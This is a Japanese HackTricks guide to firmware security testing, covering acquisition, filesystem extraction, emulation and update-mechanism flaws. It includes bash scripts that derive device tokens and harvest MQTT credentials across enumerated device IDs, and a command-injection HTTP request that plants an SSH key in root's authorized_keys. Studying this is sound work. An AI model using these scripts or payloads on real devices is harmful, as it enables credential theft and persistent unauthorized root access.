# ファームウェア解析

{{#include ../../banners/hacktricks-training.md}}

## **導入**

### 関連リソース


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

ファームウェアは、ハードウェアコンポーネントとユーザーが操作するソフトウェア間の通信を管理・仲介することでデバイスが正しく動作するようにする必須のソフトウェアです。永続メモリに格納されており、電源投入直後から重要な命令へアクセスできるようにして、オペレーティングシステムの起動へと繋がります。ファームウェアを解析・場合によっては改変することは、セキュリティ脆弱性を特定する上で重要なステップです。

## **情報収集**

**情報収集**は、デバイスの構成や使用されている技術を理解するための重要な初期段階です。このプロセスでは以下のデータを収集します:

- 実行されているCPUアーキテクチャとオペレーティングシステム
- ブートローダの詳細
- ハードウェア構成とデータシート
- コードベースのメトリクスとソースの配置
- 外部ライブラリとライセンス種別
- アップデート履歴と規制認証
- アーキテクチャ図やフロー図
- セキュリティ評価と特定された脆弱性

この目的のため、open-source intelligence (OSINT) ツールは非常に有用であり、入手可能なオープンソースソフトウェアコンポーネントを手動および自動でレビューして分析することも重要です。[Coverity Scan](https://scan.coverity.com) や [Semmle’s LGTM](https://lgtm.com/#explore) のようなツールは、潜在的な問題を見つけるために利用できる無料の静的解析を提供しています。

## **ファームウェアの取得**

ファームウェアの入手は様々な方法で行え、それぞれ難易度が異なります:

- **Directly** ソース（開発者、製造元）から
- **Building** 提供された手順からビルドする
- **Downloading** 公式サポートサイトからダウンロードする
- **Google dork** クエリを利用してホストされているファームウェアファイルを見つける
- **cloud storage** に直接アクセスし、[S3Scanner](https://github.com/sa7mon/S3Scanner) のようなツールを使う
- man-in-the-middle techniques を用いて **updates** を傍受する
- デバイスから **Extracting**（**UART**, **JTAG**, **PICit** などの接続を通じて）
- デバイス通信内の更新要求を **Sniffing** する
- **hardcoded update endpoints** を特定して利用する
- ブートローダやネットワークから **Dumping** する
- 最後の手段として、適切なハードウェアツールを使用してストレージチップを **Removing and reading** する

## ファームウェアの解析

ファームウェアを**入手した**ら、その取り扱いを決めるためにファームウェアから情報を抽出する必要があります。これに使用できる様々なツールが存在します:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
もしこれらのツールであまり見つからない場合は、イメージの**entropy**を`binwalk -E <bin>`で確認してください。entropyが低ければ暗号化されている可能性は低いです。entropyが高ければ、暗号化されている（あるいは何らかの方法で圧縮されている）可能性が高いです。

さらに、これらのツールを使って**ファームウェア内部に埋め込まれたファイル**を抽出できます:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使ってファイルを検査できます。

### ファイルシステムの取得

前述の `binwalk -ev <bin>` のようなツールを使えば、**ファイルシステムを抽出できているはず**です。\
Binwalkは通常、抽出物を**ファイルシステムタイプを名前にしたフォルダ**の中に保存します。一般的には次のいずれかです: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 手動でのファイルシステム抽出

場合によっては、binwalkがシグネチャにファイルシステムの**magic byte**を含んでいないことがあります。このような場合は、binwalkを使ってファイルシステムのオフセットを**見つけ**、バイナリから圧縮されたファイルシステムを**切り出し**、そのタイプに応じて下記の手順で**手動で抽出**してください。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
以下の **dd command** を実行して、Squashfs filesystem をカービングしてください。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatively, the following command could also be run.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上の例で使用）

`$ unsquashfs dir.squashfs`

Files will be in "`squashfs-root`" directory afterwards.

- CPIO アーカイブファイルの場合

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 ファイルシステムの場合

`$ jefferson rootfsfile.jffs2`

- NAND フラッシュを使用する ubifs ファイルシステムの場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## ファームウェアの解析

ファームウェアを入手したら、その構造と潜在的な脆弱性を理解するために解析することが重要です。このプロセスでは、ファームウェアイメージから有用なデータを分析・抽出するためにさまざまなツールを利用します。

### 初期解析ツール

バイナリファイル（以下 `<bin>` と表記）の初期検査に役立つコマンド群を示します。これらのコマンドは、ファイルタイプの特定、文字列の抽出、バイナリデータの解析、パーティションやファイルシステムの詳細把握に役立ちます：
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
イメージの暗号化状況を評価するには、**entropy** を `binwalk -E <bin>` で確認します。entropy が低いと暗号化されていないことを示唆し、entropy が高いと暗号化または圧縮の可能性を示します。

埋め込みファイル（**embedded files**）を抽出するには、**file-data-carving-recovery-tools** のドキュメントやファイル検査用の **binvis.io** などのツールやリソースが推奨されます。

### ファイルシステムの抽出

通常、`binwalk -ev <bin>` を使用するとファイルシステムを抽出でき、出力は多くの場合ファイルシステムの種類名（例: squashfs、ubifs）を付けたディレクトリになります。しかし、マジックバイトが欠落しているために **binwalk** がファイルシステムの種類を認識できない場合は、手動で抽出する必要があります。これは `binwalk` を使ってファイルシステムのオフセットを特定し、続いて `dd` コマンドでファイルシステムを切り出す操作を含みます:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
その後、ファイルシステムのタイプ（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するために異なるコマンドが使用されます。

### ファイルシステム解析

ファイルシステムを抽出したら、セキュリティ欠陥の探索を開始します。安全でないネットワークデーモン、ハードコードされた資格情報、API エンドポイント、更新サーバーの機能、未コンパイルのコード、起動スクリプト、およびオフライン解析用のコンパイル済みバイナリに注意を払います。

**重要な場所**および**項目**（確認対象）は次のとおりです:

- ユーザー資格情報のための **etc/shadow** と **etc/passwd**
- **etc/ssl** にある SSL 証明書と鍵
- 潜在的な脆弱性を含む設定ファイルやスクリプトファイル
- 追加解析のための組み込みバイナリ
- 一般的な IoT デバイスのウェブサーバとバイナリ

ファイルシステム内の機密情報や脆弱性を発見するために役立つツールがいくつかあります:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) and [**Firmwalker**](https://github.com/craigz28/firmwalker) for sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) for comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), and [**EMBA**](https://github.com/e-m-b-a/emba) for static and dynamic analysis

### コンパイル済みバイナリのセキュリティチェック

ファイルシステム内で見つかったソースコードとコンパイル済みバイナリの両方を脆弱性について精査する必要があります。Unix バイナリ向けの **checksec.sh** や Windows バイナリ向けの **PESecurity** のようなツールは、悪用される可能性のある保護されていないバイナリを特定するのに役立ちます。

## 派生した URL トークンを介したクラウド設定と MQTT 資格情報の収集

多くの IoT ハブは、デバイスごとの設定を次のようなクラウドエンドポイントから取得します:

- `https://<api-host>/pf/<deviceId>/<token>`

ファームウェア解析中に、`<token>` がハードコードされた秘密を用いてデバイスIDからローカルに導出されていることが見つかる場合があります。例えば:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計では、deviceId と STATIC_KEY を知る者は誰でも URL を再構築してクラウド設定を取得できるため、平文の MQTT 資格情報やトピックプレフィックスが露出することがよくあります。

実用的なワークフロー:

1) UART のブートログから deviceId を抽出する

- 3.3V の UART アダプタ（TX/RX/GND）を接続してログを取得する:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- 例えば、cloud config URL pattern と broker address を出力している行を探します:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) ファームウェアから STATIC_KEY と token アルゴリズムを復元する

- バイナリを Ghidra/radare2 にロードし、config path ("/pf/") や MD5 の使用箇所を検索する。
- アルゴリズムを確認する（例: MD5(deviceId||STATIC_KEY)）。
- Bash で token を導出し、digest を大文字化する:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config と MQTT credentials を収集する

- URL を作成して curl で JSON を取得し、jq で解析して secrets を抽出する:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 平文の MQTT と弱いトピック ACLs を悪用する（存在する場合）

- 回収した認証情報を使ってメンテナンス用トピックを購読し、機密性の高いイベントを探す：
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 予測可能なデバイスIDを列挙する（大規模に、認可された状態で）

- 多くのエコシステムはベンダーのOUIやproduct/typeといったバイト列を埋め込み、その後に連続するサフィックスが付与される。
- 候補IDを反復し、トークンを導出して、プログラムでconfigsを取得できる：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
注意
- mass enumerationを試みる前に、必ず明示的な許可を得てください。
- 可能な場合は、対象ハードウェアを変更せずに秘密を回収するため、emulation または static analysis を優先してください。

emulating firmware のプロセスは、デバイスの動作全体または個々のプログラムの**dynamic analysis**を可能にします。このアプローチはハードウェアやarchitectureへの依存性による課題に直面することがありますが、root filesystem や特定の binaries を、Raspberry Pi のような対応する architecture と endianness を持つデバイスや、事前構築された仮想マシンに移すことで、さらなるテストが容易になります。

### 個別のbinariesのエミュレーション

単一のプログラムを調べる場合、プログラムの endianness と CPU architecture を特定することが重要です。

#### MIPS Architecture の例

MIPS Architecture の binary をエミュレートするには、次のコマンドを使用できます：
```bash
file ./squashfs-root/bin/busybox
```
必要なエミュレーションツールをインストールするには:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS（ビッグエンディアン）の場合は `qemu-mips` を使用し、リトルエンディアンのバイナリには `qemu-mipsel` が選択されます。

#### ARM Architecture Emulation

ARM バイナリの場合もプロセスは同様で、エミュレーションには `qemu-arm` エミュレータが利用されます。

### Full System Emulation

[ Firmadyne ](https://github.com/firmadyne/firmadyne)、[ Firmware Analysis Toolkit ](https://github.com/attify/firmware-analysis-toolkit) などのツールはフルファームウェアエミュレーションを容易にし、プロセスの自動化や動的解析を支援します。

## Dynamic Analysis in Practice

この段階では、実機またはエミュレートされたデバイス環境のいずれかを使って解析を行います。OS やファイルシステムへのシェルアクセスを維持することが重要です。エミュレーションは必ずしもハードウェアの挙動を完全に再現しないため、時折エミュレーションを再起動する必要があります。解析ではファイルシステムを再確認し、公開されているウェブページやネットワークサービスを突き、ブートローダの脆弱性も調査してください。ファームウェアの整合性テストはバックドアの可能性を特定するために重要です。

## Runtime Analysis Techniques

ランタイム解析は、プロセスやバイナリをその実行環境で操作することを含み、gdb-multiarch、Frida、Ghidra のようなツールを用いてブレークポイントを設定し、fuzzing やその他の手法で脆弱性を特定します。

## Binary Exploitation and Proof-of-Concept

特定した脆弱性の PoC を作成するには、ターゲットアーキテクチャの深い理解と低水準言語でのプログラミングが必要です。組み込みシステムではバイナリのランタイム保護は稀ですが、存在する場合は Return Oriented Programming (ROP) のような技術が必要になることがあります。

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) のようなオペレーティングシステムは、必要なツールを備えたファームウェアセキュリティテスト用の事前設定済み環境を提供します。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は IoT デバイスのセキュリティ評価と penetration testing を行うためのディストリビューションです。必要なツールがすべてロードされた事前設定済み環境を提供することで、多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 ベースの組み込みセキュリティテスト用オペレーティングシステムで、ファームウェアセキュリティテストツールがプリロードされています。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

ベンダがファームウェアイメージに対して暗号署名チェックを実装していても、**version rollback (downgrade) 保護が欠落していることが頻繁にあります**。ブートローダやリカバリローダが埋め込み公開鍵で署名のみを検証し、フラッシュされるイメージの *version*（または単調増加カウンタ）を比較しない場合、攻撃者は正当に署名されたままの **古い脆弱なファームウェアをインストール** して、修正済みの脆弱性を再導入できます。

典型的な攻撃ワークフロー:

1. **古い署名済みイメージを入手する**
* ベンダーの公開ダウンロードポータル、CDN、サポートサイトから入手する。
* 付随するモバイル/デスクトップアプリケーションから抽出する（例: Android APK 内の `assets/firmware/`）。
* VirusTotal、Internet アーカイブ、フォーラムなどのサードパーティリポジトリから取得する。
2. **デバイスにイメージをアップロードまたは提供する** via any exposed update channel:
* Web UI、mobile-app API、USB、TFTP、MQTT など。
* 多くのコンシューマ向け IoT デバイスは *unauthenticated* な HTTP(S) エンドポイントを公開しており、Base64 エンコードされた firmware blobs を受け取り、サーバー側でデコードして recovery/upgrade をトリガーします。
3. ダウングレード後、より新しいリリースで修正された脆弱性（例えば後で追加された command-injection フィルタなど）を悪用する。
4. 必要に応じて最新イメージを再フラッシュするか、永続化が得られたら検出を避けるために更新を無効にする。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
脆弱な（ダウングレードされた）ファームウェアでは、`md5` パラメータがサニタイズされることなく直接 shell command に連結され、任意のコマンド注入を可能にします（ここでは — enabling SSH key-based root access）。後続のファームウェアバージョンでは基本的な文字フィルタが導入されましたが、ダウングレード保護が無いためその修正は無意味です。

### モバイルアプリからのファームウェア抽出

多くのベンダーは、アプリがBluetooth/Wi‑Fi経由でデバイスを更新できるように、専用のモバイルアプリ内に完全なファームウェアイメージを同梱しています。これらのパッケージは一般的にAPK/APEX内の `assets/fw/` や `res/raw/` のようなパスに暗号化されずに格納されています。`apktool`、`ghidra`、あるいは単純な `unzip` といったツールを使えば、物理ハードウェアに触れずに署名済みイメージを抽出できます。
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### アップデートロジック評価チェックリスト

* *update endpoint* のトランスポート／認証は十分に保護されていますか（TLS + 認証）？
* デバイスはフラッシング前に **バージョン番号** または **単調なアンチロールバックカウンタ** を比較していますか？
* イメージはセキュアブートチェーン内で検証されていますか（例：ROMコードによる署名チェック）？
* userland code は追加のサニティチェック（例：許可されたパーティションマップ、モデル番号）を行っていますか？
* *partial* または *backup* のアップデートフローは同じ検証ロジックを再利用していますか？

> 💡  上記のいずれかが欠けている場合、そのプラットフォームはロールバック攻撃に対して脆弱である可能性が高いです。

## 演習用の脆弱なファームウェア

ファームウェアの脆弱性発見を練習するには、以下の脆弱なファームウェアプロジェクトを出発点として使用してください。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 参考文献

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## トレーニングと認定

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
